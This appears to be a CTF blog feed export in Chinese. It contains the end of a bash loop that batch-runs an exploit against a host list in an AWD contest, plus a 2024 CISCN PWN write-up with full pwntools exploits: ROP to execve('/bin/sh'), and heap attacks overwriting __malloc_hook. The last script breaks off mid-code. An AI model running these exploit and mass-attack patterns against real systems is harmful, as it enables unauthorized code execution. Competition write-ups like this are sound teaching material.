 <span class="token builtin class-name">local</span> <span class="token assign-left variable">jobs</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">line</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> hosts<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>        <span class="token function">timeout</span> <span class="token parameter variable">--foreground</span> <span class="token variable">$run_time</span> python3 ./exp.py <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">&amp;</span>        <span class="token function">sleep</span> <span class="token variable">$next_attack_time</span>        <span class="token variable"><span class="token punctuation">((</span>jobs<span class="token operator">++</span><span class="token punctuation">))</span></span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$jobs</span>"</span> <span class="token parameter variable">-ge</span> <span class="token string">"<span class="token variable">$max_concurrent_attacks</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token function">wait</span> <span class="token comment"># Wait for all background jobs to finish</span>            <span class="token assign-left variable">jobs</span><span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">fi</span>    <span class="token keyword">done</span>    <span class="token function">wait</span> <span class="token comment"># Ensure all attacks are complete before moving on</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Waiting <span class="token variable">$wait_submit_time</span> s to submit flag<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    <span class="token function">sleep</span> <span class="token variable">$wait_submit_time</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Submitting flag<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    python3 ./submit_flag.py<span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> attack_times<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token assign-left variable">m</span><span class="token operator">=</span><span class="token string">"-------- round <span class="token variable">$i</span> --------"</span>    log <span class="token string">"<span class="token variable">$m</span>"</span>    attack <span class="token variable">$i</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Waiting next round<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    <span class="token function">sleep</span> <span class="token variable">$round_wait_time</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;code&gt;awd&lt;/code&gt;的批量攻击一直都在看&lt;code&gt;pwn&lt;/code&gt;，&lt;code&gt;web&lt;/code&gt;准备过几个脚本但还没实践过，这次上海市赛决赛现场调了一下批量攻击一句话木马的脚本，也是在现场废了不少时间…拿&lt;code&gt;pwn&lt;/code&gt;的脚本改的，感觉</summary>
      
    
    
    
    <category term="web" scheme="https://starrysky1004.github.io/categories/web/"/>
    
    
    <category term="web" scheme="https://starrysky1004.github.io/tags/web/"/>
    
    <category term="awd" scheme="https://starrysky1004.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>2024CISCN初赛PWN</title>
    <link href="https://starrysky1004.github.io/2024/05/19/2024ciscn-chu-sai/"/>
    <id>https://starrysky1004.github.io/2024/05/19/2024ciscn-chu-sai/</id>
    <published>2024-05-19T12:52:26.000Z</published>
    <updated>2024-07-14T00:27:53.328Z</updated>
    
    <content type="html"><![CDATA[<p>题目：<a href="https://github.com/0xviol1t/CTF-challenges/tree/main/2024/CISCN%E5%88%9D%E8%B5%9B/PWN">https://github.com/0xviol1t/CTF-challenges/tree/main/2024/CISCN%E5%88%9D%E8%B5%9B/PWN</a></p><h3 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h3><p>其实<code>func2</code>就是后门，输入很长的内容会提示<code>unexpected return</code>，根据返回地址判断填充长度为<code>0x1d0</code>，但是填充内容只能是<code>\x00</code>，所以本题可以填充后直接返回到<code>func2</code>，比赛的时候想到的是<code>rop</code>链，但是直接写入很长的<code>rop</code>链内容会被改变，所以需要一次读到<code>bss</code>段再迁移到<code>bss</code>段</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.133.9'</span><span class="token punctuation">,</span> <span class="token number">15152</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>syscall <span class="token operator">=</span> <span class="token number">0x0000000000404043</span>pop_rdi_r14_r13_r12_rbp_rbx_ret <span class="token operator">=</span> <span class="token number">0x00000000004a18a5</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x000000000042138a</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x00000000004944ec</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x000000000040f984</span>leave_ret <span class="token operator">=</span> <span class="token number">0x00000000004A0BCF</span>bss <span class="token operator">=</span> <span class="token number">0x579600</span>pop_rbp_ret <span class="token operator">=</span> <span class="token number">0x4023ed</span>p1 <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x1d0</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_r14_r13_r12_rbp_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'message'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>p2 <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_r14_r13_r12_rbp_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h3><p>堆溢出改掉<code>top chunk size</code>，申请的堆块大小大于<code>top chunk</code>，<code>top chunk</code>就会被链入<code>unsorted bin</code>并且重新映射新的<code>top chunk</code>，继续申请小的堆块就能切割被链入<code>unsorted bin</code>的前<code>top chunk</code>得到<code>libc</code>地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.133.76'</span><span class="token punctuation">,</span> <span class="token number">30239</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'length'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'length'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name.'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/libc-2.23.so'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name.'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf91</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c5188</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf03a4</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'length'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h3><p><code>2.35</code>开了沙箱的堆</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.132.179'</span><span class="token punctuation">,</span> <span class="token number">37299</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'idx'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'idx'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'idx'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x200</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x200</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x240</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x501</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x340</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0xf8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x200</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x200</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span>add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x240</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span 